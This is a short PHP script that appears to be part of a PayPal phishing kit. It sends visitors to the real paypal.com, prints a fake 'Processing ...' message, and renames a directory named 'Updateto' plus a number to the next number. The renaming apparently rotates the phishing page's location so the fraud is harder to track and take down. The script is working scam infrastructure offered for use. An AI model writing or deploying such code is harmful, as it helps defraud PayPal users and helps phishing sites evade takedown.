<?php

$scam = "Updateto";
header('location:http://paypal.com');
for($i=0;$i<100;$i++){
echo '<font color=agent size=4>Processing ...</font>';
if(file_exists($scam.$i)){
$n = $i+1;
rename("$scam"."$i","$scam"."$n");

exit;
}
}

?>